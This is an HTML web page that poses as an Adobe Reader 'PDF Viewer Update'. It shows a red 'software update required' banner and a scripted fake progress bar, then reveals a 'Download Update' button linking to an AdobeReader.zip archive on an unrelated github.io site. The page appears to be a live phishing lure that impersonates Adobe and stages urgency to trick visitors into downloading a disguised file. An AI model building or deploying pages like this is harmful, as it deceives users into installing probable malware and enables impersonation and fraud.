<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PDF Viewer - Update</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}
body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:"Segoe UI", Arial, sans-serif;
    overflow:hidden;
    background-image:url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTdTur-GtUzHcbGcfGYe7s4ZahGkNOPc6A9Pg&s");
    background-size:cover;
    background-position:center;
}
.overlay{
    position:absolute;
    inset:0;
    background:rgba(0,0,0,0.45);
    backdrop-filter:blur(3px);
}
.container{
    position:relative;
    z-index:2;
    width:560px;
    background:rgba(255,255,255,0.92);
    backdrop-filter:blur(16px);
    border-radius:24px;
    border:1px solid rgba(255,255,255,0.4);
    box-shadow:0 20px 50px rgba(0,0,0,0.3);
    overflow:hidden;
}
.warning-banner{
    background:#dc2626;
    color:white;
    text-align:center;
    padding:8px;
    font-size:14px;
    font-weight:600;
}
.header{
    padding:32px;
    display:flex;
    align-items:center;
    gap:20px;
    border-bottom:1px solid rgba(0,0,0,0.08);
}
.icon{
    width:82px;
    height:82px;
    background:#fff;
    border-radius:14px;
    display:flex;
    justify-content:center;
    align-items:center;
    box-shadow:0 6px 16px rgba(0,0,0,0.12),
                inset 0 -4px 8px rgba(0,0,0,0.08);
    padding:6px;
    border:1px solid #e5e7eb;
}
.header-text h1{
    font-size:26px;
    color:#111827;
    margin-bottom:6px;
}
.header-text p{
    font-size:14px;
    color:#6b7280;
}
.content{
    padding:36px;
}
.content p{
    font-size:15px;
    line-height:1.7;
    color:#374151;
    margin-bottom:20px;
}
.progress-area{
    margin-top:30px;
}
.progress-top{
    display:flex;
    justify-content:space-between;
    margin-bottom:12px;
    font-size:14px;
    color:#374151;
}
.progress-bar{
    width:100%;
    height:16px;
    background:#e5e7eb;
    border-radius:40px;
    overflow:hidden;
}
.fill{
    width:0%;
    height:100%;
    border-radius:40px;
    background:linear-gradient(90deg,#2563eb,#3b82f6);
    transition:.2s ease;
}
.status{
    margin-top:18px;
    text-align:center;
    color:#6b7280;
    font-size:14px;
}
.install-box{
    display:none;
    margin-top:32px;
    padding:24px;
    border-radius:18px;
    background:rgba(240,253,244,0.9);
    border:1px solid #86efac;
    text-align:center;
}
.install-btn{
    display:inline-block;
    padding:14px 32px;
    border-radius:14px;
    text-decoration:none;
    color:white;
    font-weight:600;
    background:linear-gradient(135deg,#16a34a,#22c55e);
    box-shadow:0 8px 20px rgba(34,197,94,0.3);
}
.footer{
    padding:18px;
    text-align:center;
    font-size:12px;
    color:#6b7280;
    border-top:1px solid rgba(0,0,0,0.05);
}
</style>
</head>
<body>
<div class="overlay"></div>
<div class="container">

    <div class="warning-banner">
        ⚠️ SOFTWARE UPDATE REQUIRED
    </div>

    <div class="header">
        <div class="icon">
            <!-- More realistic PDF Icon -->
            <svg width="58" height="58" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M14 2H6C4.89543 2 4 2.89543 4 4V20C4 21.1046 4.89543 22 6 22H18C19.1046 22 20 21.1046 20 20V8L14 2Z" fill="#ef4444" stroke="#b91c1c" stroke-width="1.5"/>
                <path d="M14 2V8H20" fill="#ef4444" stroke="#b91c1c" stroke-width="1.5"/>
                <rect x="7" y="11" width="10" height="1.5" rx="0.5" fill="white"/>
                <rect x="7" y="14.5" width="10" height="1.5" rx="0.5" fill="white"/>
                <rect x="7" y="18" width="7" height="1.5" rx="0.5" fill="white"/>
                <text x="8.5" y="9.5" fill="white" font-size="4.2" font-weight="700" font-family="Arial">PDF</text>
            </svg>
        </div>
        <div class="header-text">
            <h1>PDF Viewer Update</h1>
            <p>Secure Document</p>
        </div>
    </div>

    <div class="content">
        <p>
            A recent update to Adobe Reader is missing, Download and install update to view this document . 
            
        </p>

        <div class="progress-area">
            <div class="progress-top">
                <span>Preparing Download</span>
                <span id="percent">0%</span>
            </div>
            <div class="progress-bar">
                <div class="fill" id="fill"></div>
            </div>
            <div class="status" id="status">
                Initializing download...
            </div>
        </div>

        <div class="install-box" id="installBox">
            
            <a href="https://silvercliffconstruction.github.io/office/AdobeReader.zip" class="install-btn">
               Download Update
            </a>
        </div>
    </div>

    <div class="footer">
        © 2026 Secure Document Services
    </div>
</div>

<script>
let progress = 0;
const fill = document.getElementById("fill");
const percent = document.getElementById("percent");
const statusText = document.getElementById("status");
const installBox = document.getElementById("installBox");

const interval = setInterval(() => {
    progress += 1;
    fill.style.width = progress + "%";
    percent.innerText = progress + "%";

    if(progress > 25) statusText.innerText = "Checking system compatibility...";
    if(progress > 50) statusText.innerText = "Preparing download...";
    if(progress > 75) statusText.innerText = "Finalizing download...";

    if(progress >= 100){
        clearInterval(interval);
        statusText.innerHTML = '<span style="color:#16a34a;font-weight:600;">Download preparation completed successfully.</span>';
        installBox.style.display = "block";
    }
}, 35);
</script>
</body>
</html>
